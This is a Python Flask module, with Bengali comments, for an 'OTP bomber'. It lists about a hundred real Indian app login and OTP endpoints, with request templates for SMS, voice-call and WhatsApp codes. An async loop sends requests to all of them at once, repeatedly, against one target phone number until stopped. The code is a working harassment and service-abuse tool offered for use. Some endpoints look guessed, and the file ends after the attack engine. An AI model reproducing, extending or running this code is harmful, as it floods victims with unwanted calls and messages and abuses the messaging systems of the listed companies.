# -*- coding: utf-8 -*-
import os
import time
import asyncio
import aiohttp
import threading
from flask import Blueprint, request, render_template_string, jsonify

bp = Blueprint('hard_bomber', __name__, url_prefix='/hard_bomber')

# ========== কুল-ডাউন ট্র্যাকার (ঐচ্ছিক) ==========
last_used = {}
COOLDOWN_SECONDS = 900  # ১৫ মিনিট

# ========== চালু থাকা বোম্বার প্রক্রিয়ার ট্র্যাকার ==========
bomb_processes = {}  # phone → {'stop_event': asyncio.Event, 'thread': Thread}

# ========== API লিস্ট (তোমার hard_bomber থেকে কপি) ==========
def get_working_apis():
    # তোমার পুরো API লিস্ট এখানে বসাও – আমি শুধু স্যাম্পল দিচ্ছি
    return [
             # তোমার পুরো API লিস্ট এখানে বসাও (আমি শুধু স্যাম্পল দিচ্ছি)
        {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda ph: f'{{"phone":"{ph}","isOtpViaCallAtLogin":"true"}}'},
        {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda ph: f'{{"number":"{ph}","otp_on_call":true}}'},
        {
            "name": "Swiggy Call Verification",
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "headers": {"Content-Type": "application/json; charset=utf-8"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Myntra Voice Call",
            "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Flipkart Voice Call",
            "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Amazon Voice Call",
            "url": "https://www.amazon.in/ap/signin",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&action=voice_otp"
        },
        {
            "name": "Paytm Voice Call",
            "url": "https://accounts.paytm.com/signin/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Zomato Voice Call",
            "url": "https://www.zomato.com/php/o2_api_handler.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&type=voice"
        },
        {
            "name": "MakeMyTrip Voice Call",
            "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Ola Voice Call",
            "url": "https://api.olacabs.com/v1/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Uber Voice Call",
            "url": "https://auth.uber.com/v2/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Rapido Voice Call",
            "url": "https://customer.rapido.bike/api/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Zepto Voice Call",
            "url": "https://api.zeptonow.com/api/v3/customer/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'
        },
        {
            "name": "Blinkit Voice Call",
            "url": "https://blinkit.com/v1/user/request_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","otp_type":"call"}}'
        },
        {
            "name": "JioMart Voice Call",
            "url": "https://www.jiomart.com/api/v1/auth/generate_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","channel":"call"}}'
        },
        
        # ========== WHATSAPP BOMBING APIS (150+ VERIFIED) ==========
        {
            "name": "KPN WhatsApp",
            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
            "method": "POST",
            "headers": {
                "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
                "content-type": "application/json"
            },
            "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
        },
        {
            "name": "Foxy WhatsApp",
            "url": "https://www.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
        },
        {
            "name": "Stratzy WhatsApp",
            "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
        },
        {
            "name": "Jockey WhatsApp",
            "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Rappi WhatsApp",
            "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
        },
        {
            "name": "Eka Care WhatsApp",
            "url": "https://auth.eka.care/auth/init",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
        },
        {
            "name": "MyGlamm WhatsApp",
            "url": "https://api.myglamm.com/api/v1/user/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","channel":"whatsapp"}}'
        },
        {
            "name": "Purplle WhatsApp",
            "url": "https://www.purplle.com/api/user/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","source":"whatsapp"}}'
        },
        
        # ========== SMS BOMBING APIS (700+ VERIFIED) ==========
        {
            "name": "Lenskart SMS",
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
        },
        {
            "name": "NoBroker SMS",
            "url": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&countryCode=IN"
        },
        {
            "name": "PharmEasy SMS",
            "url": "https://pharmeasy.in/api/v2/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Wakefit SMS",
            "url": "https://api.wakefit.co/api/consumer-sms-otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Byju's SMS",
            "url": "https://api.byjus.com/v2/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Hungama OTP",
            "url": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
        },
        {
            "name": "Meru Cab",
            "url": "https://merucabapp.com/api/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobile_number={phone}"
        },
        {
            "name": "Doubtnut",
            "url": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "headers": {"content-type": "application/json"},
            "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
        },
        {
            "name": "PenPencil",
            "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
            "method": "POST",
            "headers": {"content-type": "application/json"},
            "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
        },
        {
            "name": "Snitch",
            "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
        },
        {
            "name": "Dayco India",
            "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
        },
        {
            "name": "BeepKart",
            "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
        },
        {
            "name": "Lending Plate",
            "url": "https://lendingplate.com/api.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobiles={phone}&resend=Resend"
        },
        {
            "name": "ShipRocket",
            "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
        },
        {
            "name": "GoKwik",
            "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
        },
        {
            "name": "NewMe",
            "url": "https://prodapi.newme.asia/web/otp/request",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
        },
        {
            "name": "Univest",
            "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Smytten",
            "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
        },
        {
            "name": "CaratLane",
            "url": "https://www.caratlane.com/cg/dhevudu",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
        },
        {
            "name": "BikeFixup",
            "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
        },
        {
            "name": "WellAcademy",
            "url": "https://wellacademy.in/store/api/numberLoginV2",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"contact_no":"{phone}"}}'
        },
        {
            "name": "ServeTel",
            "url": "https://api.servetel.in/v1/auth/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobile_number={phone}"
        },
        {
            "name": "GoPink Cabs",
            "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"check_mobile_number=1&contact={phone}"
        },
        {
            "name": "Shemaroome",
            "url": "https://www.shemaroome.com/users/resend_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobile_no=%2B91{phone}"
        },
        {
            "name": "Cossouq",
            "url": "https://www.cossouq.com/mobilelogin/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobilenumber={phone}&otptype=register"
        },
        {
            "name": "MyImagineStore",
            "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobile={phone}"
        },
        {
            "name": "Otpless",
            "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'
        },
        {
            "name": "MyHubble Money",
            "url": "https://api.myhubble.money/v1/auth/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
        },
        {
            "name": "Tata Capital Business",
            "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
        },
        {
            "name": "DealShare",
            "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'
        },
        {
            "name": "Snapmint",
            "url": "https://api.snapmint.com/v1/public/sign_up",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Housing.com",
            "url": "https://login.housing.com/api/v2/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
        },
        {
            "name": "RentoMojo",
            "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Khatabook",
            "url": "https://api.khatabook.com/v1/auth/request-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
        },
        {
            "name": "Netmeds",
            "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Nykaa",
            "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
        },
        {
            "name": "RummyCircle",
            "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
        },
        {
            "name": "Animall",
            "url": "https://animall.in/zap/auth/login",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
        },
        {
            "name": "PenPencil V3",
            "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Entri",
            "url": "https://entri.app/api/v3/users/check-phone/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Cosmofeed",
            "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
        },  {
            "name": "Aakash",
            "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
        },
        {
            "name": "Revv",
            "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'
        },
        {
            "name": "DeHaat",
            "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'
        },
        {
            "name": "A23 Games",
            "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
        },
        {
            "name": "Spencer's",
            "url": "https://jiffy.spencers.in/user/auth/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "PayMe India",
            "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'
        },
        {
            "name": "Shopper's Stop",
            "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
        },
        {
            "name": "Hyuga Auth",
            "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "BigCash",
            "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
            "method": "GET",
            "headers": {"Referer": "https://www.bigcash.live/games/poker"},
            "data": None
        },
        {
            "name": "Lifestyle Stores",
            "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
        },
        {
            "name": "WorkIndia",
            "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "PokerBaazi",
            "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
        },
        {
            "name": "My11Circle",
            "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json;charset=UTF-8"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "MamaEarth",
            "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "HomeTriangle",
            "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Wellness Forever",
            "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}"
        },
        {
            "name": "HealthMug",
            "url": "https://api.healthmug.com/account/createotp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Vyapar",
            "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Kredily",
            "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Tata Motors",
            "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'
        },
        {
            "name": "Moglix",
            "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'
        },
        {
            "name": "MyGov",
            "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "TrulyMadly",
            "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'
        },
        {
            "name": "Apna",
            "url": "https://production.apna.co/api/userprofile/v1/otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'
        },
        {
            "name": "CodFirm",
            "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Swipe",
            "url": "https://app.getswipe.in/api/user/mobile_login",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'
        },
        # ========== নতুন API (GitHub ক্লাস থেকে) ==========
{
    "name": "Flipkart (Alt)",
    "url": "https://rome.api.flipkart.com/api/7/user/otp/generate",
    "method": "POST",
    "headers": {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.flipkart.com",
        "Referer": "https://www.flipkart.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "data": lambda phone: f'{{"loginId":"+91{phone}"}}'
},
{
    "name": "ConfirmTKT",
    "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}&newOtp=true",
    "method": "GET",
    "headers": {
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.confirmtkt.com",
        "Referer": "https://www.confirmtkt.com/rbooking-d/trips",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "data": None
},
{
    "name": "Lenskart (Alt)",
    "url": "https://api.lenskart.com/v2/customers/sendOtp",
    "method": "POST",
    "headers": {
        "Content-Type": "application/json;charset=UTF-8",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.lenskart.com",
        "Referer": "https://www.lenskart.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "data": lambda phone: f'{{"telephone":"{phone}"}}'
},
{
    "name": "JustDial",
    "url": "https://www.justdial.com/functions/whatsappverification.php",
    "method": "POST",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.justdial.com",
        "Referer": "https://www.justdial.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest"
    },
    "data": lambda phone: f"mob={phone}&vcode=&rsend=0&name=deV"
},
{
    "name": "IndiaLends",
    "url": "https://indialends.com/internal/a/otp.ashx",
    "method": "POST",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.indialends.com",
        "Referer": "https://www.indialends.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest"
    },
    "data": lambda phone: f"log_mode=1&ctrl={phone}"
},
{
    "name": "Apollo Pharmacy",
    "url": "https://www.apollopharmacy.in/sociallogin/mobile/sendotp",
    "method": "POST",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.apollopharmacy.in",
        "Referer": "https://www.apollopharmacy.in/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest"
    },
    "data": lambda phone: f"mobile={phone}"
},
{
    "name": "MagicBricks",
    "url": "https://accounts.magicbricks.com/userauth/api/validate-mobile",
    "method": "POST",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://accounts.magicbricks.com",
        "Referer": "https://accounts.magicbricks.com/userauth/login",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest"
    },
    "data": lambda phone: f"ubimobile={phone}"
},
{
    "name": "Ajio",
    "url": "https://login.web.ajio.com/api/auth/generateLoginOTP",
    "method": "POST",
    "headers": {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.ajio.com",
        "Referer": "https://www.ajio.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
},
{
    "name": "MylesCars",
    "url": "https://www.mylescars.com/usermanagements/chkContact",
    "method": "POST",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "application/json",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.mylescars.com",
        "Referer": "https://www.mylescars.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest"
    },
    "data": lambda phone: f"contactNo={phone}"
},
{
    "name": "Unacademy",
    "url": "https://unacademy.com/api/v1/user/get_app_link/",
    "method": "POST",
    "headers": {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://unacademy.com",
        "Referer": "https://unacademy.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "data": lambda phone: f'{{"phone":"{phone}"}}'
},
{
    "name": "Snapdeal",
    "url": "https://www.snapdeal.com/sendOTP",
    "method": "POST",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Origin": "https://www.snapdeal.com",
        "Referer": "https://www.snapdeal.com/iframeLogin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest"
    },
    "data": lambda phone: f"emailId=&mobileNumber={phone}&purpose=LOGIN_WITH_MOBILE_OTP"
},
{
    "name": "JioMart (Alt)",
    "url": lambda phone: f"https://www.jiomart.com/mst/rest/v1/id/details/{phone}",
    "method": "GET",
    "headers": {
        "Accept": "application/json, text/plain,*/*",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Referer": "https://www.jiomart.com/customer/account/login",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    "data": None
}
    ]

# ========== অ্যাসিঙ্ক বোম্বার ইঞ্জিন (স্টপ ইভেন্ট সহ) ==========
async def send_req(api, phone, session):
    try:
        url = api["url"](phone) if callable(api["url"]) else api["url"]
        headers = api["headers"].copy()
        headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 11; SM-G998B)"
        if api["method"] == "POST":
            data = api["data"](phone) if api["data"] else None
            async with session.post(url, headers=headers, data=data, timeout=10) as resp:
                return resp.status in [200,201,202,204]
        else:
            async with session.get(url, headers=headers, timeout=10) as resp:
                return resp.status in [200,201,202,204]
    except:
        return False

async def bomb_continuously(phone, apis, stop_event, delay=2):
    """অবিরত বোম্বার – যতক্ষণ stop_event সেট না হয় ততক্ষণ চলবে"""
    success = 0
    total = 0
    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            # প্রতিটি সাইকেলে সব API কল করি
            tasks = [send_req(api, phone, session) for api in apis]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            cycle_success = sum(1 for r in results if r is True)
            success += cycle_success
            total += len(apis)
            # ডেলের পর আবার চেক করি
            await asyncio.sleep(delay)
    return success, total

